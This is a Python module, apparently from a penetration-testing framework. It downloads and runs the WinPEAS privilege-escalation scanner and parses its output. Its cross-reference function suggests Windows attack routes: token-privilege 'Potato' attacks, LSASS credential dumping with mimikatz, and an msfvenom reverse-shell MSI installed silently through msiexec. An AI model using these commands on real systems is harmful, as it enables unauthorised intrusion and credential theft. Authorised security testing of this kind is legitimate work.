"""WinPEAS runner — download, deploy, execute, parse.

Counterpart to linpeas_runner. WinPEAS is a Windows privesc enum exe.
Two flavors are released: winPEASx64.exe / winPEASx86.exe and a .bat fallback.

Transports supported:
  - SMB upload via impacket smbclient
  - PowerShell remoting (winrm via evil-winrm or impacket)
  - WMI via impacket-wmiexec
  - Local execution (for testing on a Windows host you control)

This module focuses on download + parse. Transport orchestration is left
to the caller's foothold tool of choice — winpeas binaries go on disk
in temp, run, output captured, file deleted.

No third-party deps — stdlib only.
"""

from __future__ import annotations

import asyncio
import logging
import os
import re
import shutil
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

logger = logging.getLogger("viper.winpeas")

WINPEAS_X64_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
WINPEAS_X86_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe"
WINPEAS_BAT_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat"
WINPEAS_PS1_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.ps1"

DEFAULT_CACHE_DIR = Path.home() / ".cache" / "viper"

# ANSI / WinPEAS uses similar color scheme to linpeas
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[a-zA-Z]")
_RED = re.compile(r"\x1b\[1;31m|\x1b\[31;1m|\x1b\[91m")
_YELLOW = re.compile(r"\x1b\[1;33m|\x1b\[33;1m|\x1b\[93m")


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------


@dataclass
class WinpeasFinding:
    section: str
    line: str  # ANSI-stripped
    severity: str  # "high" / "medium" / "low" / "info"
    raw_color: Optional[str] = None


@dataclass
class WinpeasReport:
    target: str = ""
    findings: list[WinpeasFinding] = field(default_factory=list)
    sections_seen: list[str] = field(default_factory=list)
    output_lines: int = 0
    error: Optional[str] = None
    cross_refs: dict = field(default_factory=dict)

    @property
    def high(self) -> list[WinpeasFinding]:
        return [f for f in self.findings if f.severity == "high"]

    @property
    def medium(self) -> list[WinpeasFinding]:
        return [f for f in self.findings if f.severity == "medium"]


# ---------------------------------------------------------------------------
# Section markers — winpeas section banners
# ---------------------------------------------------------------------------

WINPEAS_SECTIONS: list[tuple[str, str]] = [
    ("Basic System Information",                "System Info"),
    ("User Information",                        "User Info"),
    ("Token Privileges",                        "Token Privileges"),
    ("Current Logged Users",                    "Logged Users"),
    ("Recently Logged Users",                   "Recent Logins"),
    ("Always Install Elevated",                 "AlwaysInstallElevated"),
    ("WSUS",                                    "WSUS"),
    ("Hijackable Paths",                        "PATH Hijack"),
    ("AutoRuns",                                "Autoruns"),
    ("Services Information",                    "Services"),
    ("Modifiable Services",                     "Service ACL"),
    ("Unquoted Service",                        "Unquoted Service Paths"),
    ("Process Information",                     "Processes"),
    ("Looking for credentials",                 "Credentials"),
    ("PuTTY Sessions",                          "PuTTY Sessions"),
    ("WiFi",                                    "WiFi Credentials"),
    ("Cached GPP Passwords",                    "GPP Passwords"),
    ("Internet Settings",                       "Internet Settings"),
    ("Powershell history",                      "PowerShell History"),
    ("Sticky Notes",                            "Sticky Notes"),
    ("Saved RDP",                               "RDP Saved"),
    ("Recently run commands",                   "Run History"),
    ("AppCmd.exe",                              "IIS AppCmd"),
    ("McAfee SiteList",                         "McAfee SiteList"),
    ("CMD History",                             "CMD History"),
    ("Browsers Information",                    "Browser Data"),
    ("Cloud Credentials",                       "Cloud Creds"),
    ("Generic Credentials",                     "Generic Creds"),
    ("Veeam credentials",                       "Veeam Creds"),
    ("Search Files containing pass",            "Files w/ password"),
    ("Searching ConfigSecurityPolicy",          "ConfigSecurityPolicy"),
    ("Last 15 minutes Modified Files",          "Recently Modified"),
    ("Looking for installed Apps",              "Installed Apps"),
]


def _classify_section(line: str, current: str) -> str:
    for marker, name in WINPEAS_SECTIONS:
        if marker.lower() in line.lower():
            return name
    return current


def _classify_severity(raw: str) -> tuple[str, Optional[str]]:
    if _RED.search(raw):
        return "high", "red"
    if _YELLOW.search(raw):
        return "medium", "yellow"
    return "info", None


# ---------------------------------------------------------------------------
# Local script management
# ---------------------------------------------------------------------------


async def ensure_local(
    flavor: str = "x64",
    cache_dir: Path = DEFAULT_CACHE_DIR,
    *,
    force: bool = False,
) -> Path:
    """Download winPEAS to local cache.

    flavor: "x64" / "x86" / "bat" / "ps1"
    """
    url_map = {
        "x64": (WINPEAS_X64_URL, "winPEASx64.exe"),
        "x86": (WINPEAS_X86_URL, "winPEASx86.exe"),
        "bat": (WINPEAS_BAT_URL, "winPEAS.bat"),
        "ps1": (WINPEAS_PS1_URL, "winPEAS.ps1"),
    }
    if flavor not in url_map:
        raise ValueError(f"unknown flavor: {flavor!r} (choose x64/x86/bat/ps1)")
    url, filename = url_map[flavor]
    cache_path = cache_dir / filename
    if cache_path.exists() and not force:
        return cache_path
    cache_dir.mkdir(parents=True, exist_ok=True)

    import urllib.request

    logger.info("downloading winpeas %s to %s", flavor, cache_path)

    def _download():
        with urllib.request.urlopen(url, timeout=120) as r:
            data = r.read()
        cache_path.write_bytes(data)
        return cache_path

    return await asyncio.to_thread(_download)


# ---------------------------------------------------------------------------
# Local execution (Windows host only)
# ---------------------------------------------------------------------------


async def run_local(
    flavor: str = "x64",
    *,
    extra_args: tuple[str, ...] = ("notcolor",),
    timeout: float = 600.0,
) -> str:
    """Run winpeas on the local Windows machine. Returns stdout (no ANSI by
    default — winpeas accepts 'notcolor' arg)."""
    if os.name != "nt" and flavor in ("x64", "x86"):
        raise RuntimeError(f"winpeas {flavor}.exe requires Windows; use 'bat' or 'ps1' on Linux for testing")

    script = await ensure_local(flavor)
    if flavor in ("x64", "x86"):
        cmd = [str(script), *extra_args]
    elif flavor == "bat":
        cmd = ["cmd.exe", "/c", str(script), *extra_args]
    else:  # ps1
        cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", str(script), *extra_args]

    proc = await asyncio.create_subprocess_exec(
        *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
    )
    out, err = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    return out.decode("utf-8", errors="replace")


# ---------------------------------------------------------------------------
# Output parser
# ---------------------------------------------------------------------------


def parse(output: str, target: str = "") -> WinpeasReport:
    """Parse winpeas output (with or without ANSI) into ranked findings."""
    report = WinpeasReport(target=target)
    if not output:
        report.error = "empty output"
        return report

    current_section = "Header"
    sections_seen: set[str] = set()
    lines = output.splitlines()
    report.output_lines = len(lines)

    for raw in lines:
        if not raw.strip():
            continue
        section = _classify_section(raw, current_section)
        if section != current_section:
            current_section = section
            sections_seen.add(section)

        severity, color = _classify_severity(raw)
        clean = _ANSI_RE.sub("", raw).strip()
        if not clean or len(clean) < 3:
            continue

        # Heuristic: keep red, yellow, or lines with strong privesc markers
        is_interesting = (
            severity in ("high", "medium")
            or "AlwaysInstallElevated" in clean
            or "Unquoted" in clean
            or re.search(r"SeImpersonate|SeAssign|SeBackup|SeRestore|SeDebug|SeTakeOwnership", clean)
            or "password" in clean.lower()
            or "credential" in clean.lower()
            or re.search(r"\\Users\\.+\\\.ssh", clean, re.I)
        )
        if not is_interesting:
            continue

        report.findings.append(WinpeasFinding(
            section=current_section,
            line=clean[:500],
            severity=severity if severity != "info" else "medium",
            raw_color=color,
        ))

    report.sections_seen = sorted(sections_seen)
    report.cross_refs = _cross_reference(report.findings, output)
    return report


def _cross_reference(findings: list[WinpeasFinding], full_output: str) -> dict:
    """Look for kernel CVE matches + token-priv vectors."""
    from pentest import kernel_exploits_db

    refs: dict = {"token_attacks": [], "kernel": [], "registry_lpe": []}

    # Token privileges
    for f in findings:
        if "Token" in f.section or "SeImpersonate" in f.line:
            if "SeImpersonate" in f.line:
                refs["token_attacks"].append({
                    "trigger": "SeImpersonatePrivilege",
                    "vector": "Potato (PrintSpoofer/GodPotato/Juicy)",
                })
            if "SeBackup" in f.line:
                refs["token_attacks"].append({
                    "trigger": "SeBackupPrivilege",
                    "vector": "Hive copy + secretsdump offline",
                })
            if "SeDebug" in f.line:
                refs["token_attacks"].append({
                    "trigger": "SeDebugPrivilege",
                    "vector": "LSASS dump (mimikatz / pypykatz / comsvcs.dll)",
                })

    # AlwaysInstallElevated
    for f in findings:
        if "AlwaysInstallElevated" in f.line and ("0x1" in f.line or "1 " in f.line):
            refs["registry_lpe"].append({
                "vector": "AlwaysInstallElevated",
                "exploit": "msfvenom -p windows/x64/shell_reverse_tcp ... -f msi -o evil.msi && msiexec /quiet /qn /i evil.msi",
                "confidence": "high",
            })

    # Kernel exploits — look for "OS Build" / "OS Name"
    for exp in kernel_exploits_db.lookup_windows(full_output[:8000]):
        refs["kernel"].append({
            "cve": exp.cve, "name": exp.name,
            "url": exp.exploit_url, "reliability": exp.reliability,
            "warning": "may crash box" if exp.crashes_box else None,
        })

    return refs
